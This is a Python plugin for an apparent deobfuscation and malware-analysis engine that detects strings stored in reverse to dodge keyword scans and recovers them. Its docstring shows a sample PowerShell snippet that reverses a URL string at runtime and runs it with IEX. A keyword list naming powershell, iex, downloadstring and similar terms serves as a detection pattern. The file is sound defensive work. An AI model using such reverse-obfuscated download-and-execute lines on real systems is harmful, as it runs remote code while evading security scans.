"""String-reverse decoder plugin.

Attackers frequently store the true command in reverse to defeat static
keyword scans and then reconstruct at runtime:

    $c = "1sp.a/moc.live//:ptth"
    [Array]::Reverse($c)
    IEX $c

Detection heuristic
-------------------
Reverse the payload; if the reversed form is *dramatically* more English-like
than the original (higher printable + more common trigrams like 'the', 'ing',
'com', 'http'), we treat that as a reverse-obfuscated blob and emit the
reversed text.
"""
from __future__ import annotations

import re
from typing import Any, Dict

from engine.decoder_base import BaseDecoder
from engine.models import (
    AnalysisContext,
    DetectResult,
    Fingerprint,
    MitreHint,
    PluginResult,
)
from engine.registry import DecoderRegistry


_HINT_KEYWORDS = (
    "http", "https", "https:", "http:", "://", "powershell", "cmd", "iex",
    "invoke", ".exe", ".ps1", ".com", ".net", ".org", "downloadstring",
)
# The reverse of those tokens — if any of these show up in the ORIGINAL
# payload, reversing is very likely the right move.
_REVERSED_HINTS = tuple(k[::-1] for k in _HINT_KEYWORDS)


def _hint_score(text: str) -> int:
    lower = text.lower()
    return sum(1 for kw in _HINT_KEYWORDS if kw in lower)


class ReverseStringDecoder(BaseDecoder):
    id = "reverse-string"
    name = "Reverse String"
    category = "reconstruct"
    cost = 1
    tags = ("reverse", "reconstruct", "deobfuscate")
    schema_version = "1.0"

    def detect(self, payload: str, fp: Fingerprint, ctx: AnalysisContext) -> DetectResult:
        if not payload or len(payload) < 8:
            return DetectResult(confidence=0.0, why="Too short")
        lower = payload.lower()
        rev_hits = sum(1 for kw in _REVERSED_HINTS if kw in lower)
        fwd_hits = _hint_score(payload)
        # Require the reversed form to show at least 2 new hits and beat the
        # forward form; otherwise this is a pure guess.
        if rev_hits >= 2 and rev_hits > fwd_hits:
            return DetectResult(
                confidence=0.75,
                why=f"Reversed-token hits={rev_hits} exceed forward hits={fwd_hits}",
                args={"rev_hits": rev_hits, "fwd_hits": fwd_hits},
            )
        # Second heuristic — Base64 padding `=` at the FRONT of the payload
        # is a strong signal the string was reversed (base64 padding always
        # sits at the tail in real Base64).
        #
        # NOTE: threshold DROPPED from 0.95 → 0.55 (support-team RCA
        # 2026-07-19). After nibble-swap on real customer payloads the
        # output contains parens/backticks/quotes (~61% base64-alphabet)
        # which failed the 0.95 gate and let the chain fall to wrong
        # decoders. 0.55 catches real payloads while still rejecting prose.
        stripped = payload.strip()
        if stripped.startswith("=") and len(stripped) >= 20:
            rev = stripped[::-1]
            b64_like = sum(1 for c in rev if c.isalnum() or c in "+/=")
            if b64_like / len(rev) > 0.55:
                return DetectResult(
                    confidence=0.92,
                    why=(f"Payload starts with '=' — reversed Base64 "
                         f"({b64_like/len(rev):.0%} base64-alphabet)"),
                    args={"rev_hits": 0, "fwd_hits": 0, "b64_reverse": True},
                )
        # Third heuristic (support-team RCA 2026-07-19) — actively try
        # reversing + base64-decoding and check whether the result is
        # printable text. This catches reverse-obfuscation on payloads
        # that DON'T start with `=` (e.g. because the reversal produced
        # a trailing-padding blob whose leading char is a normal base64
        # alphanum). Only fires when the reversed form has at least
        # 40% base64 characters — cheap enough to be a routine check.
        if len(stripped) >= 32 and not any(c.isspace() for c in stripped):
            rev = stripped[::-1]
            b64_like = sum(1 for c in rev if c.isalnum() or c in "+/=")
            if b64_like / len(rev) >= 0.55:
                # Attempt a probe decode
                import base64 as _b64
                probe = rev
                if len(probe) % 4:
                    probe = probe + "=" * (-len(probe) % 4)
                try:
                    decoded = _b64.b64decode(probe, validate=False)
                    printable = sum(1 for b in decoded
                                    if 32 <= b < 127 or b in (9, 10, 13))
                    if decoded and printable / max(1, len(decoded)) >= 0.75:
                        return DetectResult(
                            confidence=0.85,
                            why=("Reverse-then-Base64 probe yielded "
                                 f"{printable/max(1,len(decoded)):.0%} printable"),
                            args={"rev_hits": 0, "fwd_hits": 0,
                                  "b64_reverse_probe": True},
                        )
                except Exception:
                    pass
        return DetectResult(confidence=0.0, why="No reverse-obfuscation signal")

    def decode(self, payload: str, args: Dict[str, Any], ctx: AnalysisContext) -> PluginResult:
        reversed_text = payload[::-1]
        return PluginResult(
            output=reversed_text,
            notes=[
                "Reversed input — recovered "
                f"{args.get('rev_hits', '?')} hint token(s).",
            ],
            mitre_hints=[
                MitreHint(
                    id="T1027", technique="Obfuscated Files or Information",
                    tactic="Defense Evasion",
                    evidence="String-reverse obfuscation",
                    source="heuristic",
                ),
            ],
            explanation=(
                "Payload contained hallmark tokens in reversed form (e.g. `:sptth`, "
                "`llehsrewop`); reversing produced the true text."
            ),
        )


DecoderRegistry.register(ReverseStringDecoder())
